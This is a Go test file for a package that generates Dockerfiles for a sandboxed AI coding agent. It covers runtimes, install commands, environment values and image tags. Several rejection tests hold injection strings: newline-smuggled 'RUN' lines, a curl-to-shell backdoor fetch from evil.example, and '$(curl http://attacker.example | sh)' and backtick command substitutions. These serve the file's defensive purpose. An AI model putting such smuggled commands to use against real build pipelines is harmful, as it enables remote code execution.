package sandbox

import (
	"context"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/peter-stratton/dark-factory/internal/config"
)

func TestDefaultConfig(t *testing.T) {
	dc := DefaultDockerConfig()
	if dc.Image != "ubuntu:22.04" {
		t.Errorf("Image = %q, want ubuntu:22.04", dc.Image)
	}
	if dc.Runtime.Name != "" {
		t.Errorf("Runtime.Name = %q, want empty string", dc.Runtime.Name)
	}
	if dc.Runtime.Version != "" {
		t.Errorf("Runtime.Version = %q, want empty string", dc.Runtime.Version)
	}
	if dc.NodeVersion != "20" {
		t.Errorf("NodeVersion = %q, want 20", dc.NodeVersion)
	}
	if dc.User != "devloop" {
		t.Errorf("User = %q, want devloop", dc.User)
	}
}

func TestDockerConfigFromConfig(t *testing.T) {
	docker := config.Docker{
		Image:         "debian:bookworm",
		NodeVersion:   "18",
		User:          "runner",
		Mount:         "/src",
		ExtraPackages: []string{"vim", "jq"},
	}
	runtime := config.Runtime{Name: "go", Version: "1.26.0"}
	dc := DockerConfigFromConfig(docker, runtime, map[string]string{"GOOS": "linux"}, nil)

	if dc.Image != "debian:bookworm" {
		t.Errorf("Image = %q, want debian:bookworm", dc.Image)
	}
	if dc.Runtime.Name != "go" {
		t.Errorf("Runtime.Name = %q, want go", dc.Runtime.Name)
	}
	if dc.Runtime.Version != "1.26.0" {
		t.Errorf("Runtime.Version = %q, want 1.26.0", dc.Runtime.Version)
	}
	if dc.NodeVersion != "18" {
		t.Errorf("NodeVersion = %q, want 18", dc.NodeVersion)
	}
	if dc.User != "runner" {
		t.Errorf("User = %q, want runner", dc.User)
	}
	if dc.Mount != "/src" {
		t.Errorf("Mount = %q, want /src", dc.Mount)
	}
	if len(dc.ExtraPackages) != 2 {
		t.Fatalf("ExtraPackages len = %d, want 2", len(dc.ExtraPackages))
	}
	if len(dc.SandboxEnv) != 1 || dc.SandboxEnv["GOOS"] != "linux" {
		t.Errorf("SandboxEnv = %v, want map[GOOS:linux]", dc.SandboxEnv)
	}
}

func TestDockerConfigFromConfigDefaults(t *testing.T) {
	dc := DockerConfigFromConfig(config.Docker{}, config.Runtime{}, nil, nil)
	def := DefaultDockerConfig()

	if dc.Image != def.Image {
		t.Errorf("Image = %q, want default %q", dc.Image, def.Image)
	}
	if dc.Runtime.Name != "" {
		t.Errorf("Runtime.Name = %q, want empty string", dc.Runtime.Name)
	}
	if dc.Runtime.Version != "" {
		t.Errorf("Runtime.Version = %q, want empty string", dc.Runtime.Version)
	}
}

func TestGenerateDockerfileDefault(t *testing.T) {
	df, err := GenerateDockerfile(DefaultDockerConfig(), slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	checks := []struct {
		name    string
		contain string
	}{
		{"base image", "FROM ubuntu:22.04"},
		{"claude-code", "npm install -g @anthropic-ai/claude-code"},
		{"user directive", "USER devloop"},
		{"workdir", "WORKDIR /workspace"},
		{"node install", "setup_20.x"},
		{"useradd", "useradd -m -s /bin/bash devloop"},
		{"python3 install", "python3"},
		{"pip sdk install", "pip install 'claude-agent-sdk>=0.1.0,<0.2.0'"},
		{"copy agent runner", "COPY agent_runner.py /usr/local/bin/agent_runner.py"},
	}
	for _, c := range checks {
		if !strings.Contains(df, c.contain) {
			t.Errorf("%s: Dockerfile missing %q", c.name, c.contain)
		}
	}
}

func TestGenerateDockerfileCustomImage(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Image = "debian:bookworm"

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !strings.Contains(df, "FROM debian:bookworm") {
		t.Error("Dockerfile missing custom base image")
	}
}

func TestGenerateDockerfileGoRuntimeWithVersion(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime.Name = "go"
	cfg.Runtime.Version = "1.22.4"

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !strings.Contains(df, "go1.22.4.linux-${ARCH}.tar.gz") {
		t.Error("Dockerfile missing architecture-aware Go version URL")
	}
}

func TestGenerateDockerfileGoVersionMissingPatch(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "go", Version: "1.25"}

	_, err := GenerateDockerfile(cfg, slog.Default())
	if err == nil {
		t.Fatal("expected error for Go version without patch component, got nil")
	}
	if !strings.Contains(err.Error(), "patch component") {
		t.Errorf("error message should mention patch component, got: %v", err)
	}
}

func TestGenerateDockerfileExtraPackages(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.ExtraPackages = []string{"vim", "jq"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !strings.Contains(df, "vim") || !strings.Contains(df, "jq") {
		t.Error("Dockerfile missing extra packages")
	}
}

func TestGenerateDockerfileNonRootUser(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.User = "myuser"

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !strings.Contains(df, "useradd -m -s /bin/bash myuser") {
		t.Error("Dockerfile missing useradd for custom user")
	}
	if !strings.Contains(df, "USER myuser") {
		t.Error("Dockerfile missing USER directive for custom user")
	}
}

func TestImageTagDeterministic(t *testing.T) {
	tag1 := ImageTag("FROM ubuntu:22.04\n")
	tag2 := ImageTag("FROM ubuntu:22.04\n")
	if tag1 != tag2 {
		t.Errorf("tags differ for same content: %q vs %q", tag1, tag2)
	}

	if !strings.HasPrefix(tag1, "godark-runner:") {
		t.Errorf("tag missing prefix: %q", tag1)
	}
}

func TestImageTagChangesWithContent(t *testing.T) {
	tag1 := ImageTag("FROM ubuntu:22.04\n")
	tag2 := ImageTag("FROM debian:bookworm\n")
	if tag1 == tag2 {
		t.Error("tags should differ for different content")
	}
}

func TestBuildImageStubbedCommandRunner(t *testing.T) {
	orig := CommandRunner
	defer func() { CommandRunner = orig }()

	var capturedArgs []string
	CommandRunner = func(name string, args ...string) ([]byte, error) {
		capturedArgs = append([]string{name}, args...)
		return []byte("Successfully built"), nil
	}

	logger := slog.Default()
	tag, err := BuildImage(context.Background(), DefaultDockerConfig(), logger)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !strings.HasPrefix(tag, "godark-runner:") {
		t.Errorf("tag missing prefix: %q", tag)
	}

	if len(capturedArgs) == 0 {
		t.Fatal("CommandRunner was not called")
	}
	if capturedArgs[0] != "docker" {
		t.Errorf("expected docker command, got %q", capturedArgs[0])
	}
	if capturedArgs[1] != "build" {
		t.Errorf("expected build subcommand, got %q", capturedArgs[1])
	}

	// Verify -t flag with tag
	foundTag := false
	for i, arg := range capturedArgs {
		if arg == "-t" && i+1 < len(capturedArgs) && capturedArgs[i+1] == tag {
			foundTag = true
			break
		}
	}
	if !foundTag {
		t.Errorf("docker build missing -t %s in args: %v", tag, capturedArgs)
	}
}

func TestBuildImageWritesAgentRunner(t *testing.T) {
	orig := CommandRunner
	defer func() { CommandRunner = orig }()

	var agentRunnerFound bool
	CommandRunner = func(name string, args ...string) ([]byte, error) {
		// During docker build, check that agent_runner.py is present in the build context.
		if name == "docker" && len(args) > 0 && args[0] == "build" {
			// The build context dir is the last argument.
			buildDir := args[len(args)-1]
			pyPath := filepath.Join(buildDir, "agent_runner.py")
			if _, err := os.Stat(pyPath); err == nil {
				agentRunnerFound = true
			}
		}
		return []byte("Successfully built"), nil
	}

	_, err := BuildImage(context.Background(), DefaultDockerConfig(), slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !agentRunnerFound {
		t.Error("agent_runner.py was not written to the build context before docker build")
	}
}

func TestGenerateDockerfileIncludesPython3(t *testing.T) {
	df, err := GenerateDockerfile(DefaultDockerConfig(), slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "python3") {
		t.Error("Dockerfile missing python3 in apt-get install")
	}
}

func TestGenerateDockerfileIncludesPipInstall(t *testing.T) {
	df, err := GenerateDockerfile(DefaultDockerConfig(), slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "pip install 'claude-agent-sdk>=0.1.0,<0.2.0'") {
		t.Error("Dockerfile missing pinned claude-agent-sdk install")
	}
}

func TestGenerateDockerfileCopiesAgentRunner(t *testing.T) {
	df, err := GenerateDockerfile(DefaultDockerConfig(), slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "COPY agent_runner.py /usr/local/bin/agent_runner.py") {
		t.Error("Dockerfile missing COPY agent_runner.py directive")
	}
}

func TestGenerateDockerfileGoRuntime(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "go", Version: "1.26.0"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "go1.26.0.linux-${ARCH}.tar.gz") {
		t.Error("Go Dockerfile missing architecture-aware tarball URL")
	}
}

func TestGenerateDockerfileFlutterRuntime(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "flutter"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "git clone") || !strings.Contains(df, "flutter") {
		t.Error("Flutter Dockerfile missing git clone of flutter")
	}
	if !strings.Contains(df, "flutter precache") {
		t.Error("Flutter Dockerfile missing flutter precache")
	}
	if !strings.Contains(df, "chown -R devloop:devloop /usr/local/flutter") {
		t.Error("Flutter Dockerfile missing chown for non-root user")
	}
}

func TestGenerateDockerfileNodeRuntime(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "node"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Node.js is installed exactly once (for Claude Code), not a second time for the runtime.
	count := strings.Count(df, "nodesource.com")
	if count != 1 {
		t.Errorf("expected exactly 1 Node.js install, got %d", count)
	}
}

func TestGenerateDockerfileRustRuntime(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "rust"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "rustup") {
		t.Error("Rust Dockerfile missing rustup")
	}
}

func TestGenerateDockerfilePythonRuntime(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "python"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "python3-venv") {
		t.Error("Python Dockerfile missing python3-venv")
	}
}

func TestGenerateDockerfileEmptyRuntime(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: ""}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("empty runtime should not return error: %v", err)
	}
	// No Go, Flutter, Rust, or Python-venv-specific install expected.
	if strings.Contains(df, "go.dev/dl") {
		t.Error("empty runtime Dockerfile should not install Go")
	}
	if strings.Contains(df, "rustup") {
		t.Error("empty runtime Dockerfile should not install Rust")
	}
	if strings.Contains(df, "flutter") {
		t.Error("empty runtime Dockerfile should not install Flutter")
	}
}

func TestGenerateDockerfileGoRequiresVersion(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "go", Version: ""}

	_, err := GenerateDockerfile(cfg, slog.Default())
	if err == nil {
		t.Fatal("expected error for Go runtime without version, got nil")
	}
}

func TestGenerateDockerfileFlutterNoVersionUsesStable(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "flutter", Version: ""}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "--branch stable") {
		t.Error("Flutter Dockerfile without version should use stable branch")
	}
}

func TestGenerateDockerfileFlutterDartSDKFallsBackToStable(t *testing.T) {
	// Dart SDK constraints from pubspec.yaml are not Flutter versions,
	// so any version with range operators should fall back to stable.
	for _, v := range []string{"^3.11.0", ">=3.11.0", "~3.11.0"} {
		t.Run(v, func(t *testing.T) {
			cfg := DefaultDockerConfig()
			cfg.Runtime = config.Runtime{Name: "flutter", Version: v}

			df, err := GenerateDockerfile(cfg, slog.Default())
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if !strings.Contains(df, "--branch stable") {
				t.Errorf("expected stable branch for Dart SDK constraint %q", v)
			}
		})
	}
}

func TestGenerateDockerfileFlutterExactVersion(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "flutter", Version: "3.7.12"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "--branch 3.7.12") {
		t.Error("exact Flutter version should be used as-is")
	}
}

func TestGenerateDockerfileSandboxEnv(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.SandboxEnv = map[string]string{"GOOS": "linux"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, `ENV GOOS=linux`) {
		t.Error(`Dockerfile missing ENV GOOS=linux from SandboxEnv`)
	}
}

func TestGenerateDockerfileSandboxEnvValueWithSpacesRejected(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.SandboxEnv = map[string]string{"FOO": "bar baz"}

	_, err := GenerateDockerfile(cfg, slog.Default())
	if err == nil {
		t.Fatal("expected error for SandboxEnv value containing spaces, got nil")
	}
}

func TestGenerateDockerfileSandboxEnvNewlineRejected(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.SandboxEnv = map[string]string{"FOO": "bar\nbaz"}

	_, err := GenerateDockerfile(cfg, slog.Default())
	if err == nil {
		t.Fatal("expected error for SandboxEnv value containing newline, got nil")
	}
}

func TestGenerateDockerfileSandboxEnvValueTabRejected(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.SandboxEnv = map[string]string{"FOO": "bar\tbaz"}

	_, err := GenerateDockerfile(cfg, slog.Default())
	if err == nil {
		t.Fatal("expected error for SandboxEnv value containing tab, got nil")
	}
}

func TestGenerateDockerfileSandboxEnvKeyEqualsRejected(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.SandboxEnv = map[string]string{"FO=O": "val"}

	_, err := GenerateDockerfile(cfg, slog.Default())
	if err == nil {
		t.Fatal("expected error for SandboxEnv key containing '=', got nil")
	}
}

func TestGenerateDockerfileImageNewlineRejected(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Image = "ubuntu:22.04\nRUN evil"

	_, err := GenerateDockerfile(cfg, slog.Default())
	if err == nil {
		t.Fatal("expected error for Image containing newline, got nil")
	}
}

func TestGenerateDockerfileUserNewlineRejected(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.User = "devloop\nRUN evil"

	_, err := GenerateDockerfile(cfg, slog.Default())
	if err == nil {
		t.Fatal("expected error for User containing newline, got nil")
	}
}

func TestGenerateDockerfileNodeVersionNewlineRejected(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.NodeVersion = "20\nRUN evil"

	_, err := GenerateDockerfile(cfg, slog.Default())
	if err == nil {
		t.Fatal("expected error for NodeVersion containing newline, got nil")
	}
}

func TestGenerateDockerfileExtraPackagesNewlineRejected(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.ExtraPackages = []string{"vim\nRUN evil"}

	_, err := GenerateDockerfile(cfg, slog.Default())
	if err == nil {
		t.Fatal("expected error for ExtraPackages entry containing newline, got nil")
	}
}

func TestGenerateDockerfileRuntimeVersionNewlineRejected(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "flutter", Version: "stable\nRUN curl http://evil.example/backdoor | sh"}

	_, err := GenerateDockerfile(cfg, slog.Default())
	if err == nil {
		t.Fatal("expected error for Runtime.Version containing newline, got nil")
	}
}

func TestGenerateDockerfileElixirVersionInjectionRejected(t *testing.T) {
	cases := []string{
		`1.14.3" "malicious-pkg`,
		`$(curl http://attacker.example | sh)`,
		"1.14.3`id`",
	}
	for _, v := range cases {
		cfg := DefaultDockerConfig()
		cfg.Runtime = config.Runtime{Name: "elixir", Version: v}
		_, err := GenerateDockerfile(cfg, slog.Default())
		if err == nil {
			t.Errorf("expected error for Elixir version %q, got nil", v)
		}
	}
}

func TestGenerateDockerfileElixirRuntime(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "elixir"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "esl-erlang") {
		t.Error("Elixir Dockerfile missing Erlang/OTP install (esl-erlang)")
	}
	if !strings.Contains(df, "elixir") {
		t.Error("Elixir Dockerfile missing Elixir install")
	}
}

func TestGenerateDockerfileElixirNoVersion(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "elixir", Version: ""}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("empty Elixir version should not return error: %v", err)
	}
	// Without a version, should install latest (no version pin in apt).
	if !strings.Contains(df, "esl-erlang") {
		t.Error("Elixir Dockerfile missing esl-erlang")
	}
	if strings.Contains(df, "elixir=") {
		t.Error("Elixir Dockerfile should not pin version when Version is empty")
	}
}

func TestGenerateDockerfileElixirWithVersion(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "elixir", Version: "1.14.3"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "1.14.3") {
		t.Error("Elixir Dockerfile missing specified version")
	}
	if !strings.Contains(df, "elixir=1.14.3") {
		t.Error("Elixir Dockerfile missing versioned elixir package install")
	}
}

func TestGenerateDockerfileElixirWithConstraintVersion(t *testing.T) {
	// "~> 1.14" is the idiomatic format returned by parseMixExs; spaces must not
	// cause GenerateDockerfile to return an error.
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "elixir", Version: "~> 1.14"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("constraint-style Elixir version should not return error: %v", err)
	}
	if !strings.Contains(df, "esl-erlang") {
		t.Error("Elixir Dockerfile missing esl-erlang")
	}
}

func TestGenerateDockerfileClaudeCodeAlwaysPresent(t *testing.T) {
	runtimes := []config.Runtime{
		{Name: "go", Version: "1.26.0"},
		{Name: "flutter"},
		{Name: "node"},
		{Name: "rust"},
		{Name: "python"},
		{Name: ""},
	}
	for _, rt := range runtimes {
		cfg := DefaultDockerConfig()
		cfg.Runtime = rt
		df, err := GenerateDockerfile(cfg, slog.Default())
		if err != nil {
			t.Fatalf("runtime %q: unexpected error: %v", rt.Name, err)
		}
		if !strings.Contains(df, "npm install -g @anthropic-ai/claude-code") {
			t.Errorf("runtime %q: Dockerfile missing Claude Code install", rt.Name)
		}
	}
}

func TestGenerateDockerfileInstallCommands(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.InstallCommands = []string{
		"curl -sSfL https://golangci-lint.run/install.sh | sh -s v2.10.1",
		"go install github.com/swaggo/swag/cmd/swag@v1.16.6",
	}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !strings.Contains(df, "RUN curl -sSfL https://golangci-lint.run/install.sh | sh -s v2.10.1") {
		t.Error("Dockerfile missing first install command")
	}
	if !strings.Contains(df, "RUN go install github.com/swaggo/swag/cmd/swag@v1.16.6") {
		t.Error("Dockerfile missing second install command")
	}
}

func TestGenerateDockerfileInstallCommandsOrder(t *testing.T) {
	// InstallCommands must appear after Claude Code install (so Node and the
	// language runtime are available) but before the non-root user is created.
	cfg := DefaultDockerConfig()
	cfg.InstallCommands = []string{"curl -sSfL https://example.com/install.sh | sh"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	claudeCodePos := strings.Index(df, "npm install -g @anthropic-ai/claude-code")
	installCmdPos := strings.Index(df, "RUN curl -sSfL https://example.com/install.sh | sh")
	userPos := strings.Index(df, "USER devloop")

	if claudeCodePos < 0 {
		t.Fatal("Dockerfile missing Claude Code install")
	}
	if installCmdPos < 0 {
		t.Fatal("Dockerfile missing install command")
	}
	if userPos < 0 {
		t.Fatal("Dockerfile missing USER directive")
	}
	if installCmdPos < claudeCodePos {
		t.Error("install command appears before Claude Code install")
	}
	if installCmdPos > userPos {
		t.Error("install command appears after USER directive (must run as root)")
	}
}

func TestGenerateDockerfileInstallCommandsNewlineRejected(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.InstallCommands = []string{"curl https://example.com/install.sh\nRUN evil"}

	_, err := GenerateDockerfile(cfg, slog.Default())
	if err == nil {
		t.Fatal("expected error for InstallCommands entry containing newline, got nil")
	}
}

func TestGenerateDockerfileInstallCommandsEmpty(t *testing.T) {
	// No install commands should produce a valid Dockerfile without any extra RUN layers.
	cfg := DefaultDockerConfig()

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// The template range over an empty slice should produce no output.
	_ = df
}

func TestDockerConfigFromConfigInstallCommands(t *testing.T) {
	docker := config.Docker{
		InstallCommands: []string{
			"curl -sSfL https://golangci-lint.run/install.sh | sh -s v2.10.1",
		},
	}
	dc := DockerConfigFromConfig(docker, config.Runtime{}, nil, nil)

	if len(dc.InstallCommands) != 1 {
		t.Fatalf("InstallCommands len = %d, want 1", len(dc.InstallCommands))
	}
	if dc.InstallCommands[0] != docker.InstallCommands[0] {
		t.Errorf("InstallCommands[0] = %q, want %q", dc.InstallCommands[0], docker.InstallCommands[0])
	}
}

func TestDockerConfigFromConfigInstallCommandsEmpty(t *testing.T) {
	// Empty install_commands in config should leave DockerConfig.InstallCommands nil.
	dc := DockerConfigFromConfig(config.Docker{}, config.Runtime{}, nil, nil)
	if len(dc.InstallCommands) != 0 {
		t.Errorf("InstallCommands = %v, want empty", dc.InstallCommands)
	}
}

func TestImageTagChangesWithInstallCommands(t *testing.T) {
	cfgA := DefaultDockerConfig()
	dfA, err := GenerateDockerfile(cfgA, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	cfgB := DefaultDockerConfig()
	cfgB.InstallCommands = []string{"curl https://example.com/install.sh | sh"}
	dfB, err := GenerateDockerfile(cfgB, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if ImageTag(dfA) == ImageTag(dfB) {
		t.Error("image tags should differ when install commands change")
	}
}

func TestImageTagChangesWithRuntime(t *testing.T) {
	cfgGo := DefaultDockerConfig()
	cfgGo.Runtime = config.Runtime{Name: "go", Version: "1.26.0"}
	dfGo, err := GenerateDockerfile(cfgGo, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	cfgNode := DefaultDockerConfig()
	cfgNode.Runtime = config.Runtime{Name: "node"}
	dfNode, err := GenerateDockerfile(cfgNode, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	tagGo := ImageTag(dfGo)
	tagNode := ImageTag(dfNode)
	if tagGo == tagNode {
		t.Error("image tags should differ when runtime changes")
	}
}

func TestDockerConfigFromConfigComposeConfigured(t *testing.T) {
	compose := &config.DockerCompose{
		File:        "docker-compose.test.yml",
		ProjectName: "myproject",
	}
	dc := DockerConfigFromConfig(config.Docker{}, config.Runtime{}, nil, compose)

	if dc.ComposeFile != "docker-compose.test.yml" {
		t.Errorf("ComposeFile = %q, want docker-compose.test.yml", dc.ComposeFile)
	}
	if dc.ComposeProjectName != "myproject" {
		t.Errorf("ComposeProjectName = %q, want myproject", dc.ComposeProjectName)
	}
}

func TestDockerConfigFromConfigComposeAbsent(t *testing.T) {
	dc := DockerConfigFromConfig(config.Docker{}, config.Runtime{}, nil, nil)

	if dc.ComposeFile != "" {
		t.Errorf("ComposeFile = %q, want empty string", dc.ComposeFile)
	}
	if dc.ComposeProjectName != "" {
		t.Errorf("ComposeProjectName = %q, want empty string", dc.ComposeProjectName)
	}
}

func TestDockerConfigFromConfigComposeRoundTrip(t *testing.T) {
	compose := &config.DockerCompose{
		File:        "infra/compose.yml",
		ProjectName: "ci",
	}
	docker := config.Docker{Image: "ubuntu:22.04"}
	dc := DockerConfigFromConfig(docker, config.Runtime{Name: "go", Version: "1.26.0"}, map[string]string{"FOO": "bar"}, compose)

	if dc.Image != "ubuntu:22.04" {
		t.Errorf("Image = %q, want ubuntu:22.04", dc.Image)
	}
	if dc.ComposeFile != "infra/compose.yml" {
		t.Errorf("ComposeFile = %q, want infra/compose.yml", dc.ComposeFile)
	}
	if dc.ComposeProjectName != "ci" {
		t.Errorf("ComposeProjectName = %q, want ci", dc.ComposeProjectName)
	}
	if dc.SandboxEnv["FOO"] != "bar" {
		t.Errorf("SandboxEnv[FOO] = %q, want bar", dc.SandboxEnv["FOO"])
	}
}

func TestGenerateDockerfileDockerCLIInstalledWhenComposeConfigured(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.ComposeFile = "docker-compose.test.yml"

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "docker.io") {
		t.Error("Dockerfile missing docker.io when compose is configured")
	}
	if !strings.Contains(df, "docker-compose-linux-${ARCH}") {
		t.Error("Dockerfile missing docker-compose binary download when compose is configured")
	}
}

func TestGenerateDockerfileDockerCLIOmittedWhenComposeNotConfigured(t *testing.T) {
	cfg := DefaultDockerConfig()
	// ComposeFile is empty — Docker CLI must not be installed

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if strings.Contains(df, "docker.io") {
		t.Error("Dockerfile should not contain docker.io when compose is not configured")
	}
	if strings.Contains(df, "docker-compose-linux") {
		t.Error("Dockerfile should not contain docker-compose download when compose is not configured")
	}
}

func TestGenerateDockerfileDockerCLIAlongsideExtraPackages(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.ComposeFile = "docker-compose.test.yml"
	cfg.ExtraPackages = []string{"chromium"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "docker.io") {
		t.Error("Dockerfile missing docker.io when compose is configured alongside extra packages")
	}
	if !strings.Contains(df, "chromium") {
		t.Error("Dockerfile missing extra package chromium when compose is configured")
	}
}

func TestGenerateDockerfileClaudeCodeVersionPinned(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.ClaudeCodeVersion = "2.1.81"

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := "npm install -g @anthropic-ai/claude-code@2.1.81"
	if !strings.Contains(df, want) {
		t.Errorf("Dockerfile missing pinned claude-code version: want %q", want)
	}
}

func TestGenerateDockerfileClaudeCodeVersionUnpinned(t *testing.T) {
	cfg := DefaultDockerConfig()
	// ClaudeCodeVersion is empty — should install latest (no @version suffix).

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if strings.Contains(df, "claude-code@") {
		t.Error("Dockerfile should not pin claude-code version when ClaudeCodeVersion is empty")
	}
	if !strings.Contains(df, "npm install -g @anthropic-ai/claude-code") {
		t.Error("Dockerfile missing claude-code install")
	}
}

func TestDockerConfigFromConfigDetectsClaudeCodeVersion(t *testing.T) {
	// Stub the version detector to return a known version.
	orig := detectClaudeCodeVersion
	t.Cleanup(func() { detectClaudeCodeVersion = orig })
	detectClaudeCodeVersion = func() string { return "2.1.81" }

	dc := DockerConfigFromConfig(config.Docker{}, config.Runtime{}, nil, nil)
	if dc.ClaudeCodeVersion != "2.1.81" {
		t.Errorf("ClaudeCodeVersion = %q, want %q", dc.ClaudeCodeVersion, "2.1.81")
	}
}

func TestDockerConfigFromConfigDetectionFailureFallsBackToLatest(t *testing.T) {
	// Stub the version detector to simulate failure.
	orig := detectClaudeCodeVersion
	t.Cleanup(func() { detectClaudeCodeVersion = orig })
	detectClaudeCodeVersion = func() string { return "" }

	dc := DockerConfigFromConfig(config.Docker{}, config.Runtime{}, nil, nil)
	if dc.ClaudeCodeVersion != "" {
		t.Errorf("ClaudeCodeVersion = %q, want empty (latest fallback)", dc.ClaudeCodeVersion)
	}
}
